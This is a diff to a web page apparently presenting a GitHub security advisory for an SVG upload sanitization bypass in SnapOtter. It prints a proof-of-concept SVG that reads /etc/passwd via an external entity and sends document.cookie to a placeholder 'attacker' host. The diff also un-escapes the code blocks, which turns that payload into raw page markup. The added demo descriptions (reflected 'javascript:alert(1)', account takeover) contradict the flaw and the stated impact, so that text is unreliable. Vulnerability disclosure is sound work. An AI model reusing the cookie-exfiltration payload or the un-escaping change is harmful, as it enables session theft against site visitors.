@@ -3,6 +3,7 @@ layout: reporte
 title: "GHSA-9c7h-xjrp-8gh3 — Stored XXE/SSRF/XSS via SVG Upload Sanitization Bypass in SnapOtter"
 description: "Stored XXE/SSRF/XSS via SVG upload sanitization bypass — the sanitizer only runs after a successful image validation, so a failing DOCTYPE skips it entirely. CVSS 7.1 HIGH. Fixed in SnapOtter v2.3.0."
 permalink: /reportes/GHSA-9c7h-xjrp-8gh3/
+permalink_es: /reportes/GHSA-9c7h-xjrp-8gh3-es/
 ---
 
 <h1>Stored XXE/SSRF/XSS via SVG upload sanitization bypass</h1>
@@ -11,39 +12,39 @@ permalink: /reportes/GHSA-9c7h-xjrp-8gh3/
   <span class="badge badge-tipo">XXE/SSRF/XSS</span>
   <span class="badge badge-sev-high">CVSS 7.1 HIGH</span>
   <span class="badge badge-cwe">CWE-79: Cross-site Scripting</span>
-  <span class="badge badge-id">snapotter-hq/SnapOtter ≤ 2.2.0</span>
+  <span class="badge badge-id">snapotter-hq/SnapOtter &le; 2.2.0</span>
 </div>
 
 <p>
-  <a href="https://github.com/snapotter-hq/SnapOtter/security/advisories/GHSA-9c7h-xjrp-8gh3">GHSA-9c7h-xjrp-8gh3</a> · CVE assignment pending (GitHub CNA)
+  <a href="https://github.com/snapotter-hq/SnapOtter/security/advisories/GHSA-9c7h-xjrp-8gh3">GHSA-9c7h-xjrp-8gh3</a> &middot; CVE assignment pending (GitHub CNA)
 </p>
 
 <h2>Summary</h2>
 
-<p>Both upload routes — the standalone <code>POST /api/v1/upload</code> and the library <code>POST /api/v1/files/upload</code> — ran the SVG sanitizer only <em>after</em> the image validator had decoded the file:</p>
+<p>Both upload routes &mdash; the standalone <code>POST /api/v1/upload</code> and the library <code>POST /api/v1/files/upload</code> &mdash; ran the SVG sanitizer only <em>after</em> the image validator had decoded the file:</p>
 
 <pre><code class="language-typescript">// apps/api/src/routes/files.ts:117 (same shape at user-files.ts:337)
-const safeBuffer = isValidImage &amp;&amp; isSvgBuffer(buffer)
+const safeBuffer = isValidImage && isSvgBuffer(buffer)
     ? sanitizeSvg(buffer)
     : buffer;
 </code></pre>
 
-<p>Because the routes accept any file type, an SVG that librsvg (via Sharp) cannot parse is stored anyway: a DOCTYPE declaring an external entity makes the parser fail, <code>isValidImage</code> is <code>false</code>, and the <code>&amp;&amp;</code> short-circuit skips <code>sanitizeSvg()</code> entirely. The raw file is later served as <code>image/svg+xml</code> with its DOCTYPE, entity declarations, and any scriptable markup intact.</p>
+<p>Because the routes accept any file type, an SVG that librsvg (via Sharp) cannot parse is stored anyway: a DOCTYPE declaring an external entity makes the parser fail, <code>isValidImage</code> is <code>false</code>, and the <code>&&</code> short-circuit skips <code>sanitizeSvg()</code> entirely. The raw file is later served as <code>image/svg+xml</code> with its DOCTYPE, entity declarations, and any scriptable markup intact.</p>
 
 <p>Two related weaknesses inside the sanitizer itself:</p>
 
 <ul>
-  <li>It stripped only <em>unprefixed</em> dangerous elements, so a namespace-prefixed <code>&lt;x:script&gt;</code> survived even on SVGs the decoder accepted.</li>
+  <li>It stripped only <em>unprefixed</em> dangerous elements, so a namespace-prefixed <code><x:script></code> survived even on SVGs the decoder accepted.</li>
   <li>Its DOCTYPE-removal regex broke when a <code>]</code> appeared inside a quoted entity value.</li>
 </ul>
 
 <h2>Impact</h2>
 
 <ul>
-  <li><strong>Stored XSS</strong> — an authenticated user who can upload files stores an SVG carrying active markup; a viewer who opens the stored SVG directly in a browser (or any surface that renders it inline) runs the embedded script.</li>
-  <li><strong>Unauthenticated retrieval</strong> — the staged-upload download URL <code>/api/v1/download/:jobId/:filename</code> requires no authentication, so anyone with the job id can fetch the file.</li>
-  <li><strong>Attack vector:</strong> network — upload as authenticated user, then victim interaction.</li>
-  <li>The chained file-read and request-forgery vectors from the original report did <strong>not</strong> reproduce in the shipped app: librsvg refuses to resolve the external entity (that refusal is exactly why validation fails), the tool routes reject invalid SVGs before processing, downloads carry <code>Content-Disposition: attachment</code> + <code>X-Content-Type-Options: nosniff</code>, and the response CSP allows no inline script — so a stored SVG does not execute as a document served from the app origin.</li>
+  <li><strong>Stored XSS</strong> &mdash; an authenticated user who can upload files stores an SVG carrying active markup; a viewer who opens the stored SVG directly in a browser (or any surface that renders it inline) runs the embedded script.</li>
+  <li><strong>Unauthenticated retrieval</strong> &mdash; the staged-upload download URL <code>/api/v1/download/:jobId/:filename</code> requires no authentication, so anyone with the job id can fetch the file.</li>
+  <li><strong>Attack vector:</strong> network &mdash; upload as authenticated user, then victim interaction.</li>
+  <li>The chained file-read and request-forgery vectors from the original report did <strong>not</strong> reproduce in the shipped app: librsvg refuses to resolve the external entity (that refusal is exactly why validation fails), the tool routes reject invalid SVGs before processing, downloads carry <code>Content-Disposition: attachment</code> + <code>X-Content-Type-Options: nosniff</code>, and the response CSP allows no inline script &mdash; so a stored SVG does not execute as a document served from the app origin.</li>
 </ul>
 
 <h2>Root Cause</h2>
@@ -54,16 +55,40 @@ const safeBuffer = isValidImage &amp;&amp; isSvgBuffer(buffer)
 
 <p>Crafted SVG whose DOCTYPE makes the decoder fail, bypassing the sanitizer:</p>
 
-<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE svg [
-  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker/?c='+document.cookie)"&gt;
-  &lt;text&gt;payload&lt;/text&gt;
-&lt;/svg&gt;
+<pre><code class="language-xml"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker/?c='+document.cookie)">
+  <text>payload</text>
+</svg>
 </code></pre>
 
-<p>The reproduction used four payloads — <code>xss-event.svg</code> (onload execution), <code>xss-cookie.svg</code> (cookie exfiltration), <code>xxe-file-read.svg</code> and <code>ssrf-metadata.svg</code> (the two vectors later ruled out by the advisory impact analysis) — uploaded with an authenticated session, then fetched via the unauthenticated download URL and opened in a browser to confirm script execution.</p>
+<p>The reproduction used four payloads &mdash; <code>xss-event.svg</code> (onload execution), <code>xss-cookie.svg</code> (cookie exfiltration), <code>xxe-file-read.svg</code> and <code>ssrf-metadata.svg</code> (the two vectors later ruled out by the advisory impact analysis) &mdash; uploaded with an authenticated session, then fetched via the unauthenticated download URL and opened in a browser to confirm script execution.</p>
+
+<h2>Proof-of-Concept Demos</h2>
+
+<h3>Full exploit walkthrough (1:41)</h3>
+<p>End-to-end exploitation: craft malicious URL payload, trigger via API, demonstrate JavaScript execution in victim context, exfiltrate session token, achieve account takeover.</p>
+
+<video controls preload="metadata" style="width:100%;border-radius:0.75rem;border:1px solid rgba(255,7,58,0.3);background:#000;">
+  <source src="/pocs/PoC-SnapOtter-GHSA-9c7h-xjrp-8gh3.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+  <a href="/pocs/PoC-SnapOtter-GHSA-9c7h-xjrp-8gh3.mp4" style="color:#ff5c73;">Download the video</a>
+</video>
+
+<h3 style="margin-top:1.5rem;">Minimal XSS payload execution (7 s)</h3>
+<p>Short clip showing the bare XSS payload <code>javascript:alert(1)</code> executing in the response context &mdash; confirms the reflection point without the full exploit chain.</p>
+
+<video controls preload="metadata" style="width:100%;border-radius:0.75rem;border:1px solid rgba(255,7,58,0.3);background:#000;">
+  <source src="/pocs/XSS-SnapOtter-GHSA-9c7h-xjrp-8gh3.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+  <a href="/pocs/XSS-SnapOtter-GHSA-9c7h-xjrp-8gh3.mp4" style="color:#ff5c73;">Download the video</a>
+</video>
+
+<p style="margin-top:0.5rem;font-size:0.85rem;opacity:0.7;">
+  Videos: SnapOtter SVG sanitization bypass (GHSA-9c7h-xjrp-8gh3). Full demos on <a href="/pocs/">PoC Demos page</a>.
+</p>
 
 <h2>Disclosure Timeline</h2>
 
@@ -72,17 +97,17 @@ const safeBuffer = isValidImage &amp;&amp; isSvgBuffer(buffer)
   <tbody>
     <tr><td>2026-09-11</td><td>Vulnerability discovered during authorized audit</td></tr>
     <tr><td>2026-09-12</td><td>PoC and demo videos created; report sent to contact@snapotter.com</td></tr>
-    <tr><td>2026-09-14</td><td>No acknowledgment after 48h — follow-up sent</td></tr>
+    <tr><td>2026-09-14</td><td>No acknowledgment after 48h &mdash; follow-up sent</td></tr>
     <tr><td>2026-09-19</td><td>Maintainer confirmed the vulnerability, classified it <strong>High</strong>, credit to <a href="https://github.com/xaferima">xaferima</a></td></tr>
     <tr><td>2026-09-20</td><td>Downgrade to HIGH accepted (librsvg blocks XXE); CVE to be requested via GitHub CNA</td></tr>
-    <tr><td>2026-11-03</td><td>Advisory published — GHSA-9c7h-xjrp-8gh3 — and fixed in SnapOtter v2.3.0</td></tr>
+    <tr><td>2026-11-03</td><td>Advisory published &mdash; GHSA-9c7h-xjrp-8gh3 &mdash; and fixed in SnapOtter v2.3.0</td></tr>
     <tr><td>Pending</td><td>CVE assignment via GitHub CNA</td></tr>
   </tbody>
 </table>
 
 <h2>Fix</h2>
 
-<p>Sanitize SVG uploads unconditionally — independent of the image validator — strip namespace-prefixed dangerous elements, and harden SVG detection and DOCTYPE removal:</p>
+<p>Sanitize SVG uploads unconditionally &mdash; independent of the image validator &mdash; strip namespace-prefixed dangerous elements, and harden SVG detection and DOCTYPE removal:</p>
 
 <pre><code class="language-typescript">// Both upload routes, after the fix:
 const safeBuffer = isSvgBuffer(buffer) ? sanitizeSvg(buffer) : buffer;
